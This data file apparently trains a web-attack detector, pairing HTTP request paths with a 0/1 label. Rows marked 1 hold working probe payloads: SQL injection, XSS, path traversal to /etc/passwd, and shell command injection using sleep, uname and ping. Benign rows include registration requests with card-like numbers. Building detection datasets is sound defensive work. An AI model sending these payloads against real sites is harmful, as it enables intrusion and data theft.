request	label
/ manager / search . php ? submit = true & search =  '  )  ; 	1
/ javascript / snoop . cc 	0
"/ quagynka . php ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / modo = registro & login = sudip & password = a25e7e & nombre = wady & apellidos = sevilla + subauste & email = stadlen @ asociaciondearquitectoslatinoamericanos . tc & dni = 60586849l & direccion = calle + rocafort ,  + 169 + 4c & ciudad = cerralbo & cp = 45569 & provincia = guadalajara & ntc = 1918370923327655 & b1 = registrar 	0
/ string / strings / parameters = -1879 %  '  )  )  or 3038 = 3038 	1
/ string / strings / parameters = kamil 	0
/ string / strings / parameters = kesling8 	0
/ bemarket / postscript / postscript . php ? p_mode = xxpathxx 	1
/ fun-morph / 	0
/ 154036 / 	0
/ string / strings / parameters = -2207 %  '  )  or  ( 8459 = 8459 )  * 4906 and  (  '  %  '  =  ' 	1
/ string / strings / parameters = 1 '  +  ( select tafk where 9652 = 9652 ; select benchmark ( 5000000 , md5 ( 0x714e4153 )  )  # 	1
/ natopfp / 	0
/ string / modo = registro & login = georgian & password = qwerty & nombre = silvio & apellidos = zempoalteca + fuxet & email = pannequin @ repretexbcn . gl & dni = 02314635f & direccion = o + casal + 135 ,  + 4 ? a & ciudad = valdelosa & cp = 29109 & provincia = soria & ntc = 4797639945557963 & b1 = registrar 	0
"/ string / strings / parameters = ""  \  ""  >  < script src =  ' data : text / javascript , prompt (  / xss /  . source )  ; var x  =  prompt ; x ( 0 )  ; x (  / xss /  . source )  ; x '  >  <  / script >  ""  , "	1
/ string / strings / parameters = 1 )  )  as nlzg where 1482 = 1482 procedure analyse ( extractvalue ( 5840 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end )  )  , 0x717a767a71 )  )  , 1 )  -- 	1
/ supersaiyan039 / 	0
/ trendmicro_phishing / 	0
/ string / strings / parameters = musson @ ajuntamentdebarcelona20 . pr 	0
"/ rpxyx07v . dll ?  < meta http-equiv = set-cookie content =  "" testbnli = 1975 ""  > "	1
/ aj-logo / 	0
"/ gvx7m5ti . jspa ?  < meta http-equiv = set-cookie content =  "" testwldz = 3506 ""  > "	1
/ string / modo = registro & login = rees & password = dular & nombre = kenji & apellidos = irizar + morata & email = alarcon @ 24htranslations . cr & dni = 75817612k & direccion = c /  + vallcorba + 152 ,  + 7 ? f & ciudad = aldeaseca + de + alba & cp = 24226 & provincia = salamanca & ntc = 4796381600285073 & b1 = registrar 	0
/ string / modo = insertar & precio = 8516 & b1 = confirmar 	0
/ 241581 / 	0
/ string / strings / parameters = 1 )  as duqb where 6495 = 6495 ; select  ( case when  ( 5914 = 2314 )  then 5914 else 1 /  ( select 0 )  end )  -- 	1
/ string / modo = insertar & precio = 7012 & b1 = pasar + por + caja 	0
/ 139676 / 	0
/ 042281 / 	0
/ string / modo = insertar & precio = 5498 & b1 = confirmar 	0
/ string / strings / parameters = 8e3i2ar 	0
/ examples / jsp / sessions / zpanel . php ? page =  / etc / passwd \ x00 	1
/ brochureware / 	0
/ examples / jsp / sessions / index . php ? search =  '  >  < script > alert (  ' autoindex_search_xss . nasl '  )  ;  <  / script >  & searchmode = f 	1
"/ main . php ? stuff =  ""  \ x0auname  # "	1
/ hexx3t / 	0
"/ 9kr0ih0v . exe ?  < meta http-equiv = set-cookie content =  "" testzgnm = 1183 ""  > "	1
"/ help . php ? q =  ""  & uname  > q34212187  # "	1
/ cgi-win / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ string / strings / parameters = 1 ""  ""  )  )  as hiuf where 3277 = 3277 and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  -- "	1
/ string / strings / parameters = 1 %  '  union all select null , null , null , null -- 	1
/ graeme / 	0
/ string / modo = registro & login = dueppen & password = li74re04 & nombre = naiemias & apellidos = salazar + borja & email = perr @ pasajesaereosbaratos . pm & dni = 83042756z & direccion = calle + villa + de + andorra + 36 + 9 ? b & ciudad = borriol & cp = 04270 & provincia = soria & ntc = 5118232940986144 & b1 = registrar 	0
/ 172246 / 	0
"/ string / strings / parameters = ""  |   [  2 -ne  $  ( echo juhlqp  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1 "	1
"/ j2kdmfw4 . mscgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ gnocky / 	0
/ javascript / sdk . ws 	0
/ top-yellow / 	0
/ scripts / root . exe ?  / c + dir + c :  \  +  / og 	1
/ doc-7012586 / 	0
/ search_nero / 	0
"/ string / strings / parameters = ""  &  & echo $ ifstiixmb $  (  ( 16 + 84 )  )  $  ( echo $ ifstiixmb ) tiixmb & "	1
/ string / strings / parameters = buleje quesada 	0
/ string / strings / parameters = octgona 	0
/ string / strings / parameters = dawson @ eco-pro . to 	0
/ string / strings / parameters = 1005 	0
/ avreceivers / 	0
/ 10tierney / 	0
/ examples / jsp / checkbox / top . php ? header =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = '  ;  str =  $  ( echo bvjepj )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  # 	1
/ th_3898 / 	0
"/ string / strings / parameters = -9361 ""  ""  )  )  union all select 3112 # "	1
"/ string / strings / parameters = 1 ""  ""  )  )  as ikuz where 7385 = 7385 ; select sleep ( 5 )  # "	1
"/ help . php ? q =  ""  | sleep 9  # "	1
/ string / strings / parameters = echo dwunas $  (  ( 73 + 45 )  )  $  ( echo dwunas ) dwunas 	1
/ string / strings / parameters = ossie 	0
/ obit_cover / 	0
"/ string / strings / parameters = < crosssitescripting style =  ""  "" crosssitescripting : expression ( document . cookie = true )  ""  ""  > "	1
/ string / strings / parameters = ' echo $ ifsenopzr $  (  ( 31 + 41 )  )  $  ( echo $ ifsenopzr ) enopzr & 	1
/ javascript / bat . exe 	1
/ human-tower / 	0
/ string / strings / parameters = | echo okczrm $  (  ( 7 + 40 )  )  $  ( echo okczrm ) okczrm ' 	1
/ computer-patents / 	0
/ cgi / r . cgi ? file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ e9rx3ya4 . asp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ afroceads / 	0
/ betablockmodules / newestgroupsmodule / newestgroupsmodule . php ? current_blockmodule_path = xxpathxx 	1
/ wash and go v4 / 	0
"/ string / strings / parameters = < body background =  ""  "" javascript : document . cookie = true ;  ""  ""  > "	1
"/ help . php ? q =  "" ping \ x0c-w \ x0c9000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 | rem \ x0c "	1
/ h_reallogo / 	0
/ knop_zhiteli / 	0
/ string / strings / parameters = 1 '  )  and  ( 3020 = 3020 )  * 6703 and  (  ' rskq '  =  ' rskq 	1
/  ?  < script > cross_site_scripting . nasl <  / script > 	1
/ is_newsgroup-1 / 	0
